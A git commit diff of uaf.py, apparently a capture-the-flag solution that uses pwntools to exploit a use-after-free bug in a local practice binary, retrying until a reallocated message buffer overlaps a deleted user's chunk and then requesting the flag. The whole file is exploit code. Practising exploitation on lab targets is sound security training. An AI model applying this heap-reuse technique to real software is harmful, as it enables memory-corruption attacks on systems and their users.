04fe590faa43f11adbfb2b5fffbdcb7dd86aeabf
ChoKyuWon <yyj10137@gmail.com>
2020-06-18 20:11:30 +0900

    script

--- uaf.py
+++ uaf.py
@@ -2,28 +2,27 @@ from pwn import *
 
 target = "use-after-free"
 
-p = process(target)
+while True:
+    p = process(target)
 
-#payload = b"a"*16 + b"user"+b"\x90"*12 +b'\x90'*16 + b"user"+b"\x90"*12 + b'\x01' + b'\x90'*7 + b'\x21'+b'\x90'*7
-payload = b'a'*64 + b'\x01'*16
-p.recvuntil(">>>")
-p.sendline("login")
-p.recvuntil(':')
-p.sendline("Kim")
-p.recvuntil(':')
-p.sendline("1234")
-p.recvuntil(">>>")
-p.sendline("delete-user")
-p.recvuntil(':')
-p.sendline("Kim")
-del_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
-p.sendline("msg")
-print(p.recvuntil(":"))
-p.sendline(payload)
-msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
-print(del_addr, msg_addr)
-
-#gdb.attach(p)
-p.sendline("get-flag")
-print(p.recvuntil(">>>"))
-exit()
+    payload = b'\x01'*72
+    p.recvuntil(">>>")
+    p.sendline("login")
+    p.recvuntil(':')
+    p.sendline("Kim")
+    p.recvuntil(':')
+    p.sendline("1234")
+    p.recvuntil(">>>")
+    p.sendline("delete-user")
+    p.recvuntil(':')
+    p.sendline("Kim")
+    del_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
+    p.sendline("msg")
+    print(p.recvuntil(":"))
+    p.sendline(payload)
+    msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
+    if (int(del_addr, 16) - 0x60) != int(msg_addr, 16):
+        continue
+    p.sendline("get-flag")
+    print(p.recvuntil(">>>"))
+    break
